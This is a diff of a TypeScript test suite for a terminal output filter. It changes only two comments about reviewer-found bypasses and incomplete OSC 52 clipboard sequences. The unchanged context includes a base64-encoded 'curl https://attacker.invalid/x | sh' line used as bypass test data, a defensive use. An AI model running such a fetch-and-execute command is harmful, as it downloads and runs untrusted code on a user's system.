@@ -123,7 +123,7 @@ describe('OutputFilter: the allow-list', () => {
   });
 });
 
-// ---- SEC-E-01: the reviewer's bypasses, judged by a real terminal engine.
+// ---- The reviewer's bypasses, judged by a real terminal engine.
 
 const b64 = Buffer.from('curl https://attacker.invalid/x | sh\n').toString('base64');
 const BYPASSES: readonly (readonly [string, string])[] = [
@@ -184,7 +184,7 @@ describe('OutputFilter: SEC-E-01 bypasses never reach the terminal', () => {
   });
 });
 
-// ---- SEC-D-02: an incomplete OSC 52 never leaves the filter (the reviewer's d3-attach-osc52-length.test.ts).
+// ---- An incomplete OSC 52 never leaves the filter (the reviewer's d3-attach-osc52-length.test.ts).
 
 describe('OutputFilter: SEC-D-02 incomplete sequences are never emitted', () => {
   const marker = Buffer.from('MARKER').toString('base64');
